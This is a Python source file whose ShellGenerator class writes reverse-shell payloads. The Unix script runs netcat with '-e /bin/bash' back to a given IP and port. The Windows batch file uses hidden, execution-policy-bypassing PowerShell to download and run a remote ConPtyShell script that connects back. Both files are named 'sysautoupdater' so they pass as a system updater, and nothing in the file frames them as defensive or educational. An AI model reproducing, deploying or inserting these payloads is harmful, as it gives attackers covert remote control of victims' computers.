import os
import sys

class ShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        # Get absolute path to output directory
        self.output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'output'))

    def generate_unix_shell(self):
        content = """#!/bin/bash
        COMMAND="nc {} {} -e /bin/bash"
        if [[ "$OSTYPE" == "darwin"* ]]; then
            osascript -e "tell application \\"Terminal\\" to do script \\"$COMMAND\\""
        elif command -v gnome-terminal &> /dev/null; then
            gnome-terminal -- bash -c "$COMMAND; exec bash"
        elif command -v xterm &> /dev/null; then
            xterm -hold -e "$COMMAND"
        elif command -v konsole &> /dev/null; then
            konsole -e bash -c "$COMMAND; exec bash"
        else
            $COMMAND  # Fallback to direct execution
        fi""".format(self.ip, self.port)
        
        self._write_file("sysautoupdater.sh", content)

    def generate_windows_shell(self):
        content = """@echo off
        powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {} {}"
        """.format(self.ip, self.port)
        
        self._write_file("sysautoupdater.bat", content)

    def _write_file(self, filename, content):
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            filepath = os.path.join(self.output_dir, filename)
            
            # Ensure we can write to the output directory
            if not os.access(os.path.dirname(filepath), os.W_OK):
                raise PermissionError(f"No write permission for directory: {self.output_dir}")
            
            with open(filepath, "w") as f:
                f.write(content.strip())  # Remove extra whitespace
            
            # Make Unix shell scripts executable
            if filename.endswith('.sh'):
                os.chmod(filepath, 0o755)
                
            print(f"Generated shell file: {filepath}")
            return True
            
        except (IOError, OSError, PermissionError) as e:
            print(f"Error generating shell file: {str(e)}", file=sys.stderr)
            return False
